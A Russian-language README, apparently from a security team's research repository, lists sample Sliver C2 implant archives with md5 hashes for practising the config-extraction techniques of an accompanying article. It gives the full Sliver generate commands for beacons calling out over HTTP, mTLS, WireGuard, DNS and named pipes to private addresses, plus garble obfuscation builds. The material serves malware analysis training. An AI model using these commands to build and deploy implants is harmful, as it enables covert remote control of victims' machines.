# Импланты Sliver под микроскопом: извлечение конфига и других полезных данных 

Ссылка на статью: [blogpost url](www.google.ru)


Здесь представлены искусственно сгенерированные нами импланты для самостоятельного изучения и отработки описанных в статье техник.

Пароль на все архивы: `infected`

В архивах импланты с md5-именем.

## 1. `sliver_old_win_386_beacon_2http_c2.zip`

Имплант старой версии 1.5.22 (с2 расшифровывается в `runtime_doInit`) с двумя http C2 с обфускацией.

**md5**

```
ffea0a01b43af45ba6eab7b05e467181
```

**Команда для генерации**

```bash
generate beacon -a 386 --http "10.10.10.1,10.10.10.2" --name sliver_win_386_beacon_2httpc2_for_education_only
```

## 2. `sliver_win_amd64_beacon_6c2_with_limits.zip`

Имплант версии 1.5.41 с множественными C2 и со всеми видами ограничений.

**md5**

```
5a8b4a7e69169d16447674863ffcc158
```

**Команда для генерации**

```bash
generate beacon -a amd64 --http "http://10.10.10.1,http://10.10.10.2" --mtls "10.10.10.3,10.10.10.4" --wg "10.10.10.5" --dns "10.10.10.6" --limit-datetime "2023-11-14T07:00:00.000Z" --limit-domainjoined --limit-fileexists "C:\Windows\Temp\flag_file.bin" --limit-hostname "sliver-implant-test-vm" --limit-locale "en-US" --limit-username "test-user" --name sliver_win_amd64_beacon_6c2_with_limits_for_education_only
```

## 3. `sliver_win_amd64_session_namedpipe.zip`

Session имплант версии 1.5.41 с named pipe.

**md5**

```
56cbb186988de40620af222e52e673bd
```

**Команда для генерации**

```bash
generate -a amd64 --named-pipe "10.10.10.1/pipe/sliver_pipe" --name sliver_win_amd64_session_namedpipe_for_education_only
```

## 4. `sliver_win_amd64_session_mtls_c2_debug.zip`

Имплант версии 1.5.41, собранный в debug-режиме, с mtls C2.

**md5**

```
bed628f5abbc502136a8e2ac501b1e70
```

**Команда для генерации**

```bash
generate -a amd64 --mtls "10.10.10.1" --debug --name sliver_win_amd64_session_mtlsc2_debug_for_education_only
```

## 5. `sliver_win_amd64_beacon_6c2_with_limits_not_stripped_wo_garble.zip`

Необфусцированная not stripped версия импланта [ `5a8b4a7e69169d16447674863ffcc158` (архив `sliver_win_amd64_beacon_6c2_with_limits.zip`)](https://github.com/4RAYS-by-SOLAR/blog/tree/main/20231114_sliver_under_microscope#2-sliver_win_amd64_beacon_6c2_with_limitszip).

**md5**

```
672473eedf84386e35740cd1d793c7df
```

**Команды для генерации**

```bash
cd ~user/.sliver/slivers/windows/amd64/sliver_win_amd64_session_mtlsc2_debug_for_education_only/src/github.com/bishopfox/sliver

GOOS=windows GOARCH=amd64 PATH=$PATH:/home/user/.sliver/go/bin/ go build -trimpath -o sliver_win_amd64_beacon_6c2_with_limits_not_stripped_wo_garble.exe
```

## 6. `src_sliver_win_amd64_beacon_6c2_with_limits.zip`

Исходный код импланта [ `5a8b4a7e69169d16447674863ffcc158` (архив `sliver_win_amd64_beacon_6c2_with_limits.zip`)](https://github.com/4RAYS-by-SOLAR/blog/tree/main/20231114_sliver_under_microscope#2-sliver_win_amd64_beacon_6c2_with_limitszip), обфусцированный `garble`.

**md5**

```
5a8b4a7e69169d16447674863ffcc158
```

**Команды для генерации:**

```bash
cd ~user/.sliver/slivers/windows/amd64/sliver_win_amd64_beacon_6c2_with_limits/src/github.com/bishopfox/sliver

GOOS=windows GOARCH=amd64 PATH=$PATH:/home/user/.sliver/go/bin garble -seed=random -literals -debugdir ~/Downloads/garbled_source_code_sliver_win_amd64_beacon_6c2_with_limits build -o sliver_win_amd64_beacon_6c2_with_limits2.exe
```

